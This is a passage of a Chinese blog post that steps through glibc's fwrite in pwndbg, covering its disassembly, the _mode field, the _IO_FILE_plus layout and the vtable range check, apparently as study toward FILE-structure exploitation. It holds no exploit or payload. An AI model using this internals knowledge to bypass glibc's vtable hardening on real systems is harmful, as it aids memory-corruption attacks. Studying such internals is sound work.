&lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7ff24 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c7ff26 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c7ff28 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7ff2a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c7ff2c &lt;+12&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c7ff2f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7ff30 &lt;+16&gt;:    imul   r12,rdx</span><br><span class="line">   0x00007ffff7c7ff34 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7ff35 &lt;+21&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c7ff39 &lt;+25&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c7ff3c &lt;+28&gt;:    je     0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c7ff42 &lt;+34&gt;:    mov    eax,DWORD PTR [rcx]</span><br><span class="line">   0x00007ffff7c7ff44 &lt;+36&gt;:    mov    r14,rdi</span><br><span class="line">   0x00007ffff7c7ff47 &lt;+39&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c7ff4a &lt;+42&gt;:    mov    rbp,rdx</span><br><span class="line">   0x00007ffff7c7ff4d &lt;+45&gt;:    mov    rbx,rcx</span><br><span class="line">   0x00007ffff7c7ff50 &lt;+48&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c7ff55 &lt;+53&gt;:    jne    0x7ffff7c7ff8b &lt;__GI__IO_fwrite+107&gt;</span><br><span class="line">   0x00007ffff7c7ff57 &lt;+55&gt;:    mov    r15,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7ff60 &lt;+64&gt;:    mov    rdi,QWORD PTR [rcx+0x88]</span><br><span class="line">   0x00007ffff7c7ff67 &lt;+71&gt;:    cmp    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7ff6b &lt;+75&gt;:    je     0x7ffff7c7ff87 &lt;__GI__IO_fwrite+103&gt;</span><br><span class="line">   0x00007ffff7c7ff6d &lt;+77&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7ff72 &lt;+82&gt;:    lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7ff76 &lt;+86&gt;:    jne    0x7ffff7c80090 &lt;__GI__IO_fwrite+368&gt;</span><br><span class="line">   0x00007ffff7c7ff7c &lt;+92&gt;:    mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7ff83 &lt;+99&gt;:    mov    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7ff87 &lt;+103&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ff8b &lt;+107&gt;:   mov    eax,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c7ff91 &lt;+113&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c7ff93 &lt;+115&gt;:   jne    0x7ffff7c80030 &lt;__GI__IO_fwrite+272&gt;</span><br><span class="line">   0x00007ffff7c7ff99 &lt;+121&gt;:   mov    DWORD PTR [rbx+0xc0],0xffffffff</span><br><span class="line">   0x00007ffff7c7ffa3 &lt;+131&gt;:   mov    r15,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c7ffaa &lt;+138&gt;:   lea    rdx,[rip+0x196a4f]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c7ffb1 &lt;+145&gt;:   lea    rax,[rip+0x1977b0]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c7ffb8 &lt;+152&gt;:   sub    rax,rdx</span><br><span class="line">   0x00007ffff7c7ffbb &lt;+155&gt;:   mov    rcx,r15</span><br><span class="line">   0x00007ffff7c7ffbe &lt;+158&gt;:   sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c7ffc1 &lt;+161&gt;:   cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c7ffc4 &lt;+164&gt;:   jbe    0x7ffff7c80080 &lt;__GI__IO_fwrite+352&gt;</span><br><span class="line">   0x00007ffff7c7ffca &lt;+170&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c7ffcd &lt;+173&gt;:   mov    rsi,r14</span><br><span class="line">   0x00007ffff7c7ffd0 &lt;+176&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7ffd3 &lt;+179&gt;:   call   QWORD PTR [r15+0x38]</span><br><span class="line">   0x00007ffff7c7ffd7 &lt;+183&gt;:   cmp    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c7ffdb &lt;+187&gt;:   mov    r14,rax</span><br><span class="line">   0x00007ffff7c7ffde &lt;+190&gt;:   sete   r15b</span><br><span class="line">   0x00007ffff7c7ffe2 &lt;+194&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c7ffe8 &lt;+200&gt;:   jne    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c7ffea &lt;+202&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fff1 &lt;+209&gt;:   sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7fff5 &lt;+213&gt;:   jne    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c7fff7 &lt;+215&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7ffff &lt;+223&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c80001 &lt;+225&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c80003 &lt;+227&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c80006 &lt;+230&gt;:   jg     0x7ffff7c80068 &lt;__GI__IO_fwrite+328&gt;</span><br><span class="line">   0x00007ffff7c80008 &lt;+232&gt;:   cmp    r12,r14</span><br><span class="line">   0x00007ffff7c8000b &lt;+235&gt;:   je     0x7ffff7c80012 &lt;__GI__IO_fwrite+242&gt;</span><br><span class="line">   0x00007ffff7c8000d &lt;+237&gt;:   test   r15b,r15b</span><br><span class="line">   0x00007ffff7c80010 &lt;+240&gt;:   je     0x7ffff7c8006f &lt;__GI__IO_fwrite+335&gt;</span><br><span class="line">   0x00007ffff7c80012 &lt;+242&gt;:   mov    r12,rbp</span><br><span class="line">   0x00007ffff7c80015 &lt;+245&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c80019 &lt;+249&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8001c &lt;+252&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8001d &lt;+253&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8001e &lt;+254&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c80020 &lt;+256&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c80022 &lt;+258&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c80024 &lt;+260&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c80026 &lt;+262&gt;:   ret</span><br><span class="line">   0x00007ffff7c80027 &lt;+263&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80030 &lt;+272&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c80033 &lt;+275&gt;:   je     0x7ffff7c7ffa3 &lt;__GI__IO_fwrite+131&gt;</span><br><span class="line">   0x00007ffff7c80039 &lt;+281&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c8003f &lt;+287&gt;:   jne    0x7ffff7c80060 &lt;__GI__IO_fwrite+320&gt;</span><br><span class="line">   0x00007ffff7c80041 &lt;+289&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c80048 &lt;+296&gt;:   sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8004c &lt;+300&gt;:   jne    0x7ffff7c80060 &lt;__GI__IO_fwrite+320&gt;</span><br><span class="line">   0x00007ffff7c8004e &lt;+302&gt;:   xor    r15d,r15d</span><br><span class="line">   0x00007ffff7c80051 &lt;+305&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c80054 &lt;+308&gt;:   jmp    0x7ffff7c7fff7 &lt;__GI__IO_fwrite+215&gt;</span><br><span class="line">   0x00007ffff7c80056 &lt;+310&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80060 &lt;+320&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c80063 &lt;+323&gt;:   jmp    0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c80065 &lt;+325&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c80068 &lt;+328&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8006d &lt;+333&gt;:   jmp    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c8006f &lt;+335&gt;:   mov    rax,r14</span><br><span class="line">   0x00007ffff7c80072 &lt;+338&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c80074 &lt;+340&gt;:   div    r13</span><br><span class="line">   0x00007ffff7c80077 &lt;+343&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c8007a &lt;+346&gt;:   jmp    0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c8007c &lt;+348&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c80080 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c80085 &lt;+357&gt;:   jmp    0x7ffff7c7ffca &lt;__GI__IO_fwrite+170&gt;</span><br><span class="line">   0x00007ffff7c8008a &lt;+362&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80090 &lt;+368&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c80095 &lt;+373&gt;:   jmp    0x7ffff7c7ff7c &lt;__GI__IO_fwrite+92&gt;</span><br><span class="line">   0x00007ffff7c8009a &lt;+378&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c8009e &lt;+382&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c800a1 &lt;+385&gt;:   jmp    0x7ffff7c291b1 &lt;__GI__IO_fwrite.cold&gt;</span><br><span class="line">Address range 0x7ffff7c291b1 to 0x7ffff7c291e7:</span><br><span class="line">   0x00007ffff7c291b1 &lt;-355695&gt;:        test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c291b7 &lt;-355689&gt;:        jne    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291b9 &lt;-355687&gt;:        mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c291c0 &lt;-355680&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c291c3 &lt;-355677&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c291c6 &lt;-355674&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c291c9 &lt;-355671&gt;:        jne    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291cb &lt;-355669&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c291d3 &lt;-355661&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c291d5 &lt;-355659&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c291d8 &lt;-355656&gt;:        jle    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291da &lt;-355654&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c291df &lt;-355649&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c291e2 &lt;-355646&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，也是和fread的开始类似，先计算要写入的字节数（为0则直接返回），再判断一下<code>_flags</code>的状态进行一些有关锁的操作<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff24 &lt;fwrite+4&gt;     push   r15</span><br><span class="line">0x7ffff7c7ff26 &lt;fwrite+6&gt;     push   r14</span><br><span class="line">0x7ffff7c7ff28 &lt;fwrite+8&gt;     push   r13</span><br><span class="line">0x7ffff7c7ff2a &lt;fwrite+10&gt;    push   r12</span><br><span class="line">0x7ffff7c7ff2c &lt;fwrite+12&gt;    mov    r12, rsi     R12 =&gt; 1</span><br><span class="line">0x7ffff7c7ff2f &lt;fwrite+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c7ff30 &lt;fwrite+16&gt;    imul   r12, rdx</span><br><span class="line">0x7ffff7c7ff34 &lt;fwrite+20&gt;    push   rbx</span><br><span class="line">0x7ffff7c7ff35 &lt;fwrite+21&gt;    sub    rsp, 8       RSP =&gt; 0x7fffffffdc90 (0x7fffffffdc98 - 0x8)</span><br><span class="line">0x7ffff7c7ff39 &lt;fwrite+25&gt;    test   r12, r12     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ff3c &lt;fwrite+28&gt;  ✘ je     fwrite+245                  &lt;fwrite+245&gt;</span><br></pre></td></tr></table></figure><p>可见判断了写入字节数<code>test r12, r12</code>是否为0，为零则跳转到<code>&lt;fwrite+245&gt;</code>，正是返回的指令<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80015 &lt;+245&gt;:   add    rsp,0x8</span><br><span class="line">0x00007ffff7c80019 &lt;+249&gt;:   mov    rax,r12</span><br><span class="line">0x00007ffff7c8001c &lt;+252&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8001d &lt;+253&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8001e &lt;+254&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c80020 &lt;+256&gt;:   pop    r13</span><br><span class="line">0x00007ffff7c80022 &lt;+258&gt;:   pop    r14</span><br><span class="line">0x00007ffff7c80024 &lt;+260&gt;:   pop    r15</span><br><span class="line">0x00007ffff7c80026 &lt;+262&gt;:   ret</span><br></pre></td></tr></table></figure><p>然后就是关于<code>_IO_FILE</code>线程锁的操作，笔者对这块知识不熟悉，就先不放了<br>再后续就是检查<code>_mode</code>字段以及<code>vtable</code>操作<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff8b &lt;fwrite+107&gt;    mov    eax, dword ptr [rbx + 0xc0]     EAX, [0x555555559360] =&gt; 0</span><br><span class="line">0x7ffff7c7ff91 &lt;fwrite+113&gt;    test   eax, eax                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ff93 &lt;fwrite+115&gt;  ✘ jne    fwrite+272                  &lt;fwrite+272&gt;</span><br></pre></td></tr></table></figure><p>这里检查<code>[rbx + 0xc0]</code>也就是<code>_IO_FILE_plus</code>偏移0xc0处，也就是<code>_mode</code>处是否为0，不为0则跳转，我们看跳转处<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里<code>_mode</code>为0，不会跳转，但还是看看跳转过去的判断<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80030 &lt;+272&gt;:   cmp    eax,0xffffffff</span><br><span class="line">0x00007ffff7c80033 &lt;+275&gt;:   je     0x7ffff7c7ffa3 &lt;__GI__IO_fwrite+131&gt;</span><br></pre></td></tr></table></figure><p><code>_mode</code>为-1则跳转回来<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff99 &lt;fwrite+121&gt;    mov    dword ptr [rbx + 0xc0], 0xffffffff     [0x555555559360] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c7ffa3 &lt;fwrite+131&gt;    mov    r15, qword ptr [rbx + 0xd8]            R15, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffaa &lt;fwrite+138&gt;    lea    rdx, [rip + 0x196a4f]                  RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffb1 &lt;fwrite+145&gt;    lea    rax, [rip + 0x1977b0]                  RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c7ffb8 &lt;fwrite+152&gt;    sub    rax, rdx                               RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffbb &lt;fwrite+155&gt;    mov    rcx, r15                               RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffbe &lt;fwrite+158&gt;    sub    rcx, rdx                               RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffc1 &lt;fwrite+161&gt;    cmp    rax, rcx                               0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br></pre></td></tr></table></figure><p>可以看到跳转回来处（我们这里其实不会跳转，因为<code>_mode</code>已经是0）后续就开始进行<code>vtable</code>的安全检查，注意<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff99 &lt;fwrite+121&gt;    mov    dword ptr [rbx + 0xc0], 0xffffffff     [0x555555559360] &lt;= 0xffffffff</span><br></pre></td></tr></table></figure><p>将<code>_mode</code>设置为-1，我们验证一下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x5555555592a0</span><br><span class="line">pwndbg&gt; x 0x5555555592a0+0xc0</span><br><span class="line">0x555555559360: 0xffffffff</span><br></pre></td></tr></table></figure><p>看到<code>_mode</code>已经被设置为了-1<br>后续对<code>vtable</code>的检查和fread一样，先判断是否在指定范围内<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ffa3 &lt;fwrite+131&gt;    mov    r15, qword ptr [rbx + 0xd8]            R15, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffaa &lt;fwrite+138&gt;    lea    rdx, [rip + 0x196a4f]                  RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffb1 &lt;fwrite+145&gt;    lea    rax, [rip + 0x1977b0]                  RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c7ffb8 &lt;fwrite+152&gt;    sub    rax, rdx                               RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffbb &lt;fwrite+155&gt;    mov    rcx, r15                               RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffbe &lt;fwrite+158&gt;    sub    rcx, rdx                               RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffc1 &lt;fwrite+161&gt;    cmp    rax, rcx                               0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ffc4 &lt;ferite+164&gt;:   jbe    0x7ffff7c80080 &lt;__GI__IO_fwrite+352&gt;</span><br></pre></td></tr></table></figure><p>不在指定范围内则调用<code>_IO_vtable_check</code>函数来进一步检查<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80080 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>这里不再赘述，后续调用<code>vtable-&gt;_IO_file_xsputn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ffca &lt;fwrite+170&gt;    mov    rdx, r12     RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c7ffcd &lt;fwrite+173&gt;    mov    rsi, r14     RSI =&gt; 0x555555559480 ◂— 0</span><br><span class="line">0x7ffff7c7ffd0 &lt;fwrite+176&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c7ffd3 &lt;fwrite+179&gt;    call   qword ptr [r15 + 0x38]      &lt;_IO_file_xsputn&gt;</span><br></pre></td></tr></table></figure><p>可以看到这里<code>r15</code>正指向<code>vtable</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r15            0x7ffff7e17600</span><br></pre></td></tr></table></figure><p><code>[r15 + 0x38]</code>处正是<code>vtable</code>中偏移0x38的<code>_IO_file_xsputn</code><br>我们还是贴上汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span 